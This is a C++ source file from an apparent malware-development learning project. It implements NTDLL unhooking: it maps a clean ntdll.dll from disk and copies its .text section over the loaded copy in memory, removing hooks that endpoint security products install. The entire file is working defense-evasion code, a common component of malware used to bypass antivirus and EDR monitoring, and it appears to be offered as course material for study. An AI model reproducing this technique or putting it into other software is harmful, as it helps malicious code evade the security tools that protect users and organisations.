/**
 * Base NTDLL unhooking => mapping ntdll from disk.
 * 
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : This code refers to maldev academy learning path.
 */

#include "header.hpp"

/**
 * Retrieve address of local ntdll.
 */
PVOID GetLocalNtdll(){
    PPEB pPeb = (PPEB)__readgsqword(PEB_OFFSET);
    if(pPeb == nullptr){
        return nullptr;
    }

    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return (PVOID)pLdr->DllBase;
}

/**
 * Map ntdll from disk.
 */
BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuff){
    HANDLE hFile        = nullptr;
    HANDLE hSection     = nullptr;
    PVOID  pNtdllBuffer = nullptr;

    CHAR cWinPath[MAX_PATH / 2] = { 0 };
    CHAR cNtdllPath[MAX_PATH]   = { 0 };

    if(GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0){
        printf("[!] GetWindowsDirectoryA failed with error : %d \n", GetLastError());
        goto _EndFunc;
    }

    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        printf("[!] Error calling CreateFileA with error : %d \n", GetLastError());
        goto _EndFunc;
    }

    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
    if(hSection == nullptr){
        printf("[!] Error calling CreateFileMappingA with error : %d \n", GetLastError());
        goto _EndFunc;
    }

    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    if(pNtdllBuffer == nullptr){
        printf("[!] MapViewOfFile failed with error : %d \n", GetLastError());
        goto _EndFunc;
    }

    *ppNtdllBuff = pNtdllBuffer;

_EndFunc:
    if(hFile){
        CloseHandle(hFile);
    }

    if(hSection){
        CloseHandle(hSection);
    }

    return *ppNtdllBuff != nullptr;
}

/**
 * Replace ntdll.
 */
BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedDll){
    PVOID pLocalNtdll = GetLocalNtdll();

    printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedDll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

    //replace begin.

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if(pDos->e_magic != IMAGE_DOS_SIGNATURE){
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNthdr = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pDos->e_lfanew);
    if(pNthdr->Signature != IMAGE_NT_SIGNATURE){
        return FALSE;
    }

    PVOID		pLocalNtdllTxt	= nullptr,	// local hooked text section base address
				pRemoteNtdllTxt = nullptr; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= 0;

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNthdr); //text section.

    for(int i = 0; i < pNthdr->FileHeader.NumberOfSections; i++){
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.'){ //check if current section == .text
            pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll  + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedDll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
        }
    }

    printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || sNtdllTxtSize == 0){ //check all ptrs.
        return FALSE;
    }

    printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

    //changing memory protect for writing.
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	
	//restoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");
	return TRUE;
}

int main(){
    PVOID pNtdll = nullptr;

    printf("[*] Fetching A New \"ntdll.dll\" File By Mapping \n");
	if (!MapNtdllFromDisk(&pNtdll)){
        return EXIT_FAILURE;
    }

    PrintState("NtProtectVirtualMemory", (PVOID)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory"));

    if (!ReplaceNtdllTxtSection(pNtdll)){
        return EXIT_FAILURE;
    }

    UnmapViewOfFile(pNtdll);

    printf("[*] Ntdll Unhooked Successfully \n");
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

    return EXIT_SUCCESS;
}
